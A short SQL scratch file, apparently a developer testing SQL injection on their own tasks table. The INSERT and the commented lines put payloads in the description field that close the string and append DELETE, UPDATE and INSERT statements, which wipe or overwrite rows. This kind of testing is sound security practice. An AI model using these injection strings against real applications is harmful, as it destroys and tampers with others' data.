	INSERT INTO tasks(
        user_id, 
        title, 
        iscomplete,
        description) 
        VALUES (1, 'Teste123', false, 'asdasd');DELETE FROM public.tasks
        WHERE (id > 10 or description = '')

        -- asdasd');DELETE FROM public.tasks WHERE (id > 10 or description = '
        -- asdasd');UPDATE tasks SET title='sql injection', description='sql injection15', is_complete=true WHERE description !=('
        -- asdasd');UPDATE tasks SET title='sql injection', description='sql injection15', is_complete=true WHERE description !=('
        -- asdasd');INSERT INTO tasks( user_id, title, is_complete, description) VALUES (1, 'INSERÇÃO POR SQL INJECTION', false, 'ASS